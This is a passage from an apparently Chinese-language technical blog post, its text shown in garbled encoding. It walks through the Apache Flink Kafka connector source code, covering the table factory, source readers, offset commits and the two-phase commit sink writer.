<p>å®šä¹‰ Flink SQL çš„ DDLï¼Œéœ€è¦å®šä¹‰ç›¸åº”çš„ Optionsã€‚</p>
</li>
<li>
<p>å®ç° DynamicTableSourceFactory å’Œ DynamicTableSinkFactoryï¼Œå¹¶æŠŠå®ç°ç±»çš„å…·ä½“è·¯å¾„å†™åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚</p>
</li>
<li>
<p>å®ç° DynamicTableSource å’Œ DynamicTableSinkï¼Œè¿™é‡Œéœ€è¦å¤„ç† SQL å±‚çš„å…ƒæ•°æ®ã€‚</p>
</li>
<li>
<p>æä¾› Providerï¼Œå°†é€»è¾‘å±‚ä¸åº•å±‚ DataStream å…³è”èµ·æ¥ã€‚</p>
</li>
<li>
<p>ç¼–å†™åº•å±‚ç®—å­ï¼Œå®ç° Source å’Œ Sink æ¥å£ã€‚</p>
</li>
</ol>
<h3 data-id="heading-5">Kafka Connector çš„å®ç°</h3>
<p>å¸¦ç€è¿™äº›çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¸€èµ·æ¥çœ‹ä¸€ä¸‹ Kafka Connector ç›¸å…³çš„æºç ã€‚</p>
<p>Kafka Connector ä»£ç ç›®å‰å·²ç»æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®äº†ã€‚é¡¹ç›®åœ°å€æ˜¯</p>
<pre><code class="hljs language-bash" lang="bash">https://github.com/apache/flink-connector-kafka
</code></pre>
<h4 data-id="heading-6">Factory</h4>
<p>æˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°å®šä¹‰çš„å·¥å‚ç±»</p>
<pre><code class="hljs language-java" lang="java">org.apache.flink.streaming.connectors.kafka.table.KafkaDynamicTableFactory
org.apache.flink.streaming.connectors.kafka.table.UpsertKafkaDynamicTableFactory
</code></pre>
<p>ä»¥ KafkaDynamicTableFactory ä¸ºä¾‹ï¼Œå®ƒåŒæ—¶å®ç°äº† DynamicTableSourceFactory å’Œ DynamicTableSinkFactory ä¸¤ä¸ªæ¥å£ã€‚</p>
<p>KafkaDynamicTableFactory åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44ee5eb786cb48809ce55e6043c3b56e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=qlEjjkldPHyzq1cTHUvag7yrLg0%3D" alt="KafkaDynamicTableFactory" loading="lazy"/></p>
<ul>
<li>
<p>factoryIdentifierï¼šè¿”å›ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå¯¹åº” Flink SQL ä¸­ connector='xxx' è¿™ä¸ªé…ç½®ã€‚</p>
</li>
<li>
<p>requiredOptionsï¼šå¿…å¡«é…ç½®é›†åˆã€‚</p>
</li>
<li>
<p>optionalOptionsï¼šé€‰å¡«é…ç½®é›†åˆã€‚</p>
</li>
<li>
<p>forwardOptionsï¼šç›´æ¥ä¼ é€’åˆ° Runtime å±‚çš„é…ç½®é›†åˆã€‚</p>
</li>
<li>
<p>createDynamicTableSourceï¼šåˆ›å»º DynamicTableSourceã€‚</p>
</li>
<li>
<p>createDynamicTableSinkï¼šåˆ›å»º DynamicTableSinkã€‚</p>
</li>
</ul>
<h4 data-id="heading-7">Source ç«¯</h4>
<p>å·¥å‚ç±»çš„ createDynamicTableSource æ–¹æ³•åˆ›å»ºäº† DynamicTableSourceï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹åˆ›å»ºçš„é€»è¾‘ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSource <span class="hljs-title function_">createDynamicTableSource</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> FactoryUtil.createTableFactoryHelper(<span class="hljs-built_in">this</span>, context);

    <span class="hljs-keyword">final</span> Optional&lt;DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt;&gt; keyDecodingFormat =
            getKeyDecodingFormat(helper);

    <span class="hljs-keyword">final</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; valueDecodingFormat =
            getValueDecodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    validateTableSourceOptions(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueDecodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">StartupOptions</span> <span class="hljs-variable">startupOptions</span> <span class="hljs-operator">=</span> getStartupOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">BoundedOptions</span> <span class="hljs-variable">boundedOptions</span> <span class="hljs-operator">=</span> getBoundedOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> getKafkaProperties(context.getCatalogTable().getOptions());

    <span class="hljs-comment">// add topic-partition discovery</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Duration</span> <span class="hljs-variable">partitionDiscoveryInterval</span> <span class="hljs-operator">=</span>
            tableOptions.get(SCAN_TOPIC_PARTITION_DISCOVERY);
    properties.setProperty(
            KafkaSourceOptions.PARTITION_DISCOVERY_INTERVAL_MS.key(),
            Long.toString(partitionDiscoveryInterval.toMillis()));

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SCAN_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSource(
            physicalDataType,
            keyDecodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueDecodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            properties,
            startupOptions.startupMode,
            startupOptions.specificOffsets,
            startupOptions.startupTimestampMillis,
            boundedOptions.boundedMode,
            boundedOptions.specificOffsets,
            boundedOptions.boundedTimestampMillis,
            context.getObjectIdentifier().asSummaryString(),
            parallelism);
}
</code></pre>
<p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œé¦–å…ˆè¦è·å–åˆ° key å’Œ value çš„è§£ç æ ¼å¼ã€‚æ¥ç€æ˜¯å„ç§å‚æ•°æ ¡éªŒå’Œè·å–å¿…è¦çš„å±æ€§ã€‚æœ€ååˆ›å»º KafkaDynamicSource å®ä¾‹ã€‚</p>
<p>è·å–è§£ç æ ¼å¼éœ€è¦ç”¨åˆ° DeserializationFormatFactory å·¥å‚ï¼ŒDeserializationFormatFactory æœ‰å¤šä¸ªå®ç°ç±»ï¼Œå¯¹åº”äº†å¤šç§æ ¼å¼çš„ååºåˆ—åŒ–æ–¹æ³•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ba6cb71d8984c6195c812c249511d1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=LgsUYXYpM0bSTFcTWOqm%2FRjz9sA%3D" alt="DeserializationFormatFactory" loading="lazy"/></p>
<p>æˆ‘ä»¬æ¥çœ‹æ¯”è¾ƒå¸¸è§çš„ Json æ ¼å¼çš„å·¥å‚ JsonFormatFactoryã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; <span class="hljs-title function_">createDecodingFormat</span><span class="hljs-params">(
        DynamicTableFactory.Context context, ReadableConfig formatOptions)</span> {
    FactoryUtil.validateFactoryOptions(<span class="hljs-built_in">this</span>, formatOptions);
    JsonFormatOptionsUtil.validateDecodingFormatOptions(formatOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">failOnMissingField</span> <span class="hljs-operator">=</span> formatOptions.get(FAIL_ON_MISSING_FIELD);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ignoreParseErrors</span> <span class="hljs-operator">=</span> formatOptions.get(IGNORE_PARSE_ERRORS);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonParserEnabled</span> <span class="hljs-operator">=</span> formatOptions.get(DECODE_JSON_PARSER_ENABLED);
    <span class="hljs-type">TimestampFormat</span> <span class="hljs-variable">timestampOption</span> <span class="hljs-operator">=</span> JsonFormatOptionsUtil.getTimestampFormat(formatOptions);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProjectableDecodingFormat</span>&lt;DeserializationSchema&lt;RowData&gt;&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DeserializationSchema&lt;RowData&gt; <span class="hljs-title function_">createRuntimeDecoder</span><span class="hljs-params">(
                DynamicTableSource.Context context,
                DataType physicalDataType,
                <span class="hljs-type">int</span>[][] projections)</span> {
            <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">producedDataType</span> <span class="hljs-operator">=</span>
                    Projection.of(projections).project(physicalDataType);
            <span class="hljs-keyword">final</span> <span class="hljs-type">RowType</span> <span class="hljs-variable">rowType</span> <span class="hljs-operator">=</span> (RowType) producedDataType.getLogicalType();
            <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; rowDataTypeInfo =
                    context.createTypeInformation(producedDataType);
            <span class="hljs-keyword">if</span> (jsonParserEnabled) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonParserRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption,
                        toProjectedNames(
                                (RowType) physicalDataType.getLogicalType(), projections));
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption);
            }
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> ChangelogMode <span class="hljs-title function_">getChangelogMode</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> ChangelogMode.insertOnly();
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsNestedProjection</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> jsonParserEnabled;
        }
    };
}
</code></pre>
<p>åœ¨åˆ›å»ºè§£ç æ ¼å¼æ—¶ï¼Œæœ€é‡è¦çš„æ˜¯åˆ›å»ºè¿è¡Œæ—¶çš„è§£ç å™¨ï¼Œä¹Ÿå°±æ˜¯ DeserializationSchemaï¼Œåœ¨ JsonFormatFactory ä¸­ï¼Œæœ‰ JsonParserRowDataDeserializationSchema å’Œ JsonRowDataDeserializationSchema ä¸¤ç§å®ç°ï¼Œåˆ†åˆ«æ˜¯ç”¨äºå°† JsonParser å’Œ JsonNode è½¬æ¢æˆä¸º RowDataï¼Œå…·ä½“çš„é€»è¾‘éƒ½åœ¨ createNotNullConverter æ–¹æ³•ä¸­ã€‚</p>
<p>äº†è§£å®Œè§£ç æ ¼å¼åï¼Œæˆ‘ä»¬æŠŠè§†è§’æ‹‰å›åˆ° KafkaDynamicSourceï¼Œå®ƒå®ç°äº†ä¸‰ä¸ªæ¥å£ ScanTableSourceã€SupportsReadingMetadataã€SupportsWatermarkPushDownã€‚åˆ†åˆ«ç”¨äºæ¶ˆè´¹æ•°æ®ï¼Œè¯»å–å…ƒæ•°æ®å’Œç”Ÿæˆæ°´å°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> ScanRuntimeProvider <span class="hljs-title function_">getScanRuntimeProvider</span><span class="hljs-params">(ScanContext context)</span> {
    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; keyDeserialization =
            createDeserialization(context, keyDecodingFormat, keyProjection, keyPrefix);

    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; valueDeserialization =
            createDeserialization(context, valueDecodingFormat, valueProjection, <span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; producedTypeInfo =
            context.createTypeInformation(producedDataType);

    <span class="hljs-keyword">final</span> KafkaSource&lt;RowData&gt; kafkaSource =
            createKafkaSource(keyDeserialization, valueDeserialization, producedTypeInfo);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataStreamScanProvider</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DataStream&lt;RowData&gt; <span class="hljs-title function_">produceDataStream</span><span class="hljs-params">(
                ProviderContext providerContext, StreamExecutionEnvironment execEnv)</span> {
            <span class="hljs-keyword">if</span> (watermarkStrategy == <span class="hljs-literal">null</span>) {
                watermarkStrategy = WatermarkStrategy.noWatermarks();
            }
            DataStreamSource&lt;RowData&gt; sourceStream =
                    execEnv.fromSource(
                            kafkaSource, watermarkStrategy, <span class="hljs-string">"KafkaSource-"</span> + tableIdentifier);
            providerContext.generateUid(KAFKA_TRANSFORMATION).ifPresent(sourceStream::uid);
            <span class="hljs-keyword">return</span> sourceStream;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBounded</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> kafkaSource.getBoundedness() == Boundedness.BOUNDED;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Optional&lt;Integer&gt; <span class="hljs-title function_">getParallelism</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> Optional.ofNullable(parallelism);
        }
    };
}
</code></pre>
<p>åœ¨ ScanRuntimeProvider çš„é€»è¾‘ä¸­ï¼Œå…ˆè·å–åˆ°ååºåˆ—åŒ–å™¨ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšæˆ‘ä»¬æåˆ°çš„ DeserializationSchemaã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fda648b380364e92baebee5c64ba586d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=rrIxhHnz6i3ip8ywXqcedhIZNis%3D" alt="KafkaSource" loading="lazy"/></p>
<p>ç„¶åå¼€å§‹åˆ›å»º KafkaSource å®ä¾‹ï¼Œå®ƒæ˜¯ Source çš„å®ç°ç±»ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œå¼•æ“å±‚äº†ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šä¾æ¬¡åˆ›å»ºå›¾ä¸­è¿™äº›ç±»ã€‚</p>
<p>KafkaSource ä¸­ä¸»è¦æ˜¯åˆ›å»º KafkaSourceReader å’Œ KafkaSourceEnumeratorï¼ŒKafkaSourceEnumerator æ˜¯è´Ÿè´£å’Œåˆ†ç‰‡ç›¸å…³çš„é€»è¾‘ï¼ŒåŒ…æ‹¬åˆ†ç‰‡åˆ†é…å’Œåˆ†ç‰‡å‘ç°ç­‰ã€‚</p>
<p>KafkaSourceReader ä¸­ä¸»è¦æ˜¯å’Œ State ç›¸å…³çš„é€»è¾‘ï¼ŒåŒ…æ‹¬è§¦å‘å¿«ç…§å’Œå®Œæˆ Checkpoint é€šçŸ¥çš„æ–¹æ³•ã€‚å½“åš Snapshot æ—¶ï¼Œä¼šè®°å½•æ´»è·ƒ split çš„ offsetï¼ŒåŒæ—¶å°† split ä½œä¸ºçŠ¶æ€æäº¤ã€‚å½“ Checkpoint å®Œæˆæ—¶ï¼Œä¼šè°ƒç”¨ <code>KafkaSourceFetcherManager.commitOffsets</code> æäº¤ offsetã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaPartitionSplit&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> {
    List&lt;KafkaPartitionSplit&gt; splits = <span class="hljs-built_in">super</span>.snapshotState(checkpointId);
    <span class="hljs-keyword">if</span> (!commitOffsetsOnCheckpoint) {
        <span class="hljs-keyword">return</span> splits;
    }

    <span class="hljs-keyword">if</span> (splits.isEmpty() &amp;&amp; offsetsOfFinishedSplits.isEmpty()) {
        offsetsToCommit.put(checkpointId, Collections.emptyMap());
    } <span class="hljs-keyword">else</span> {
        Map&lt;TopicPartition, OffsetAndMetadata&gt; offsetsMap =
                offsetsToCommit.computeIfAbsent(checkpointId, id -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());
        <span class="hljs-comment">// Put the offsets of the active splits.</span>
        <span class="hljs-keyword">for</span> (KafkaPartitionSplit split : splits) {
            <span class="hljs-comment">// If the checkpoint is triggered before the partition starting offsets</span>
            <span class="hljs-comment">// is retrieved, do not commit the offsets for those partitions.</span>
            <span class="hljs-keyword">if</span> (split.getStartingOffset() &gt;= <span class="hljs-number">0</span>) {
                offsetsMap.put(
                        split.getTopicPartition(),
                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">OffsetAndMetadata</span>(split.getStartingOffset()));
            }
        }
        <span class="hljs-comment">// Put offsets of all the finished splits.</span>
        offsetsMap.putAll(offsetsOfFinishedSplits);
    }
    <span class="hljs-keyword">return</span> splits;
}


<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyCheckpointComplete</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> Exception {
    LOG.debug(<span class="hljs-string">"Committing offsets for checkpoint {}"</span>, checkpointId);
    ...

    ((KafkaSourceFetcherManager) splitFetcherManager)
            .commitOffsets(
                    committedPartitions,
                    (ignored, e) -&gt; {...});
}
</code></pre>
<p>KafkaSourceFetcherManager è´Ÿè´£ç®¡ç† fetcher çº¿ç¨‹ï¼Œæäº¤ Offsetã€‚</p>
<p>KafkaPartitionSplitReader çš„ fetch æ–¹æ³•ç”¨æ¥æ¶ˆè´¹ Kafka çš„æ•°æ®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> RecordsWithSplitIds&lt;ConsumerRecord&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt;&gt; fetch() <span class="hljs-keyword">throws</span> IOException {
    ConsumerRecords&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt; consumerRecords;
    <span class="hljs-keyword">try</span> {
        consumerRecords = consumer.poll(Duration.ofMillis(POLL_TIMEOUT));
    } <span class="hljs-keyword">catch</span> (WakeupException | IllegalStateException e) {
        <span class="hljs-comment">// IllegalStateException will be thrown if the consumer is not assigned any partitions.</span>
        <span class="hljs-comment">// This happens if all assigned partitions are invalid or empty (starting offset &gt;=</span>
        <span class="hljs-comment">// stopping offset). We just mark empty partitions as finished and return an empty</span>
        <span class="hljs-comment">// record container, and this consumer will be closed by SplitFetcherManager.</span>
        <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(
                        ConsumerRecords.empty(), kafkaSourceReaderMetrics);
        markEmptySplitsAsFinished(recordsBySplits);
        <span class="hljs-keyword">return</span> recordsBySplits;
    }
    <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(consumerRecords, kafkaSourceReaderMetrics);
    List&lt;TopicPartition&gt; finishedPartitions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (TopicPartition tp : consumer.assignment()) {
        <span class="hljs-type">long</span> <span class="hljs-variable">stoppingOffset</span> <span class="hljs-operator">=</span> getStoppingOffset(tp);
        <span class="hljs-type">long</span> <span class="hljs-variable">consumerPosition</span> <span class="hljs-operator">=</span> getConsumerPosition(tp, <span class="hljs-string">"retrieving consumer position"</span>);
        <span class="hljs-comment">// Stop fetching when the consumer's position reaches the stoppingOffset.</span>
        <span class="hljs-comment">// Control messages may follow the last record; therefore, using the last record's</span>
        <span class="hljs-comment">// offset as a stopping condition could result in indefinite blocking.</span>
        <span class="hljs-keyword">if</span> (consumerPosition &gt;= stoppingOffset) {
            LOG.debug(
                    <span class="hljs-string">"Position of {}: {}, has reached stopping offset: {}"</span>,
                    tp,
                    consumerPosition,
                    stoppingOffset);
            recordsBySplits.setPartitionStoppingOffset(tp, stoppingOffset);
            finishSplitAtRecord(
                    tp, stoppingOffset, consumerPosition, finishedPartitions, recordsBySplits);
        }
    }

    <span class="hljs-comment">// Only track non-empty partition's record lag if it never appears before</span>
    consumerRecords
            .partitions()
            .forEach(
                    trackTp -&gt; {
                        kafkaSourceReaderMetrics.maybeAddRecordsLagMetric(consumer, trackTp);
                    });

    markEmptySplitsAsFinished(recordsBySplits);

    <span class="hljs-comment">// Unassign the partitions that has finished.</span>
    <span class="hljs-keyword">if</span> (!finishedPartitions.isEmpty()) {
        finishedPartitions.forEach(kafkaSourceReaderMetrics::removeRecordsLagMetric);
        unassignPartitions(finishedPartitions);
    }

    <span class="hljs-comment">// Update numBytesIn</span>
    kafkaSourceReaderMetrics.updateNumBytesInCounter();

    <span class="hljs-keyword">return</span> recordsBySplits;
}
</code></pre>
<p>è‡³æ­¤ï¼ŒSource ç«¯ç›¸å…³çš„æºç æˆ‘ä»¬å°±æ¢³ç†å®Œäº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å†çœ‹ Sink ç«¯çš„ä»£ç ã€‚</p>
<h4 data-id="heading-8">Sink ç«¯</h4>
<p>æˆ‘ä»¬ä»å·¥å‚ç±»ä¸­çš„ createDynamicTableSink æ–¹æ³•å¼€å§‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSink <span class="hljs-title function_">createDynamicTableSink</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span>
            FactoryUtil.createTableFactoryHelper(
                    <span class="hljs-built_in">this</span>, autoCompleteSchemaRegistrySubject(context));

    <span class="hljs-keyword">final</span> Optional&lt;EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt;&gt; keyEncodingFormat =
            getKeyEncodingFormat(helper);

    <span class="hljs-keyword">final</span> EncodingFormat&lt;SerializationSchema&lt;RowData&gt;&gt; valueEncodingFormat =
            getValueEncodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    <span class="hljs-keyword">final</span> <span class="hljs-type">DeliveryGuarantee</span> <span class="hljs-variable">deliveryGuarantee</span> <span class="hljs-operator">=</span> validateDeprecatedSemantic(tableOptions);
    validateTableSinkOptions(tableOptions);

    KafkaConnectorOptionsUtil.validateDeliveryGuarantee(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueEncodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SINK_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSink(
            physicalDataType,
            keyEncodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueEncodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            getKafkaProperties(context.getCatalogTable().getOptions()),
            getFlinkKafkaPartitioner(tableOptions, context.getClassLoader()).orElse(<span class="hljs-literal">null</span>),
            deliveryGuarantee,
            parallelism,
            tableOptions.get(TRANSACTIONAL_ID_PREFIX),
            tableOptions.get(TRANSACTION_NAMING_STRATEGY));
}
</code></pre>
<p>å’Œ Source çš„æµç¨‹å¾ˆç›¸ä¼¼ï¼Œè¿™é‡Œé¦–å…ˆæ˜¯è·å– key å’Œ value çš„ç¼–ç æ ¼å¼ï¼Œç„¶ååšäº†å¾ˆå¤šæ ¡éªŒï¼Œæœ€åæ˜¯åˆ›å»º KafkaDynamicSink å®ä¾‹ã€‚</p>
<p>è·å–ç¼–ç æ ¼å¼ç”¨åˆ°çš„å·¥å‚ç±»æ˜¯ SerializationFormatFactoryï¼Œæˆ‘ä»¬å‰é¢ä»‹ç»çš„ JsonFormatFactory ä¹Ÿå®ç°äº† SerializationFormatFactoryï¼Œå› æ­¤å®ƒæ—¢æä¾›äº†è§£ç æ ¼å¼ï¼Œåˆæä¾›äº†ç¼–ç æ ¼å¼ã€‚ç¼–ç æ ¼å¼ç”¨åˆ°çš„ç¼–ç å™¨æ˜¯ JsonRowDataSerializationSchemaï¼Œé€šè¿‡ RowDataToJsonConverters å°† RowData è½¬æ¢æˆ JsonNodeã€‚</p>
<p>åœ¨ KafkaDynamicSink çš„ getSinkRuntimeProvider æ–¹æ³•ä¸­ï¼Œä¸»è¦å°±æ˜¯åˆ›å»º KafkaSink å®ä¾‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/854b4c2fdee4487994510627457e8c5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=WYK4ar2fAKGW1M8Hpkh%2BmUxLcB4%3D" alt="KafkaSink" loading="lazy"/></p>
<p>KafkaSink ç±»å®ç°äº† TwoPhaseCommittingStatefulSink æ¥å£ï¼Œå³æ”¯æŒä¸¤é˜¶æ®µæäº¤ã€‚å®ƒåˆ›å»ºäº† KafkaWrter å’Œ KafkaCommiterã€‚</p>
<p>åˆ›å»º KafkaWriter æ—¶ï¼Œå¦‚æœé…ç½®çš„æ˜¯ ExactlyOnce æ¨¡å¼ï¼Œåˆ™ä¼šåˆ›å»ºå‡º ExactlyOnceKafkaWriterï¼Œå¦åˆ™åˆ›å»º KafkaWriterã€‚Writer çœŸæ­£å®ç°ä¸¤é˜¶æ®µæäº¤çš„æ˜¯ ExactlyOnceKafkaWriterã€‚å®ƒåœ¨å¯åŠ¨æ—¶ï¼Œä¼šè°ƒç”¨ <code>producer.beginTransaction</code> å¼€å¯ä¸€ä¸ªäº‹åŠ¡ã€‚æ•°æ®å†™å…¥æ—¶ä¼šè°ƒç”¨ <code>KafkaWriter.write</code> æ–¹æ³•ï¼Œæ­¤æ“ä½œä¼šè¢«æ ‡è®°ä¸ºäº‹åŠ¡å†…çš„æ“ä½œã€‚å½“ Sink æ”¶åˆ° Barrier æ—¶ï¼Œä¼šå…ˆè°ƒç”¨ flush æ–¹æ³•ï¼Œå°†ç¼“å†²åŒºçš„æ•°æ®éƒ½å‘é€åˆ° Kafka Brokerï¼Œç„¶åè°ƒç”¨ prepareCommit æ–¹æ³•é¢„æäº¤ã€‚é¢„æäº¤æ–¹æ³•ä¸­è®°å½• epoch å’Œ transactionalId è¿”å›ç»™æ¡†æ¶å±‚ã€‚</p>
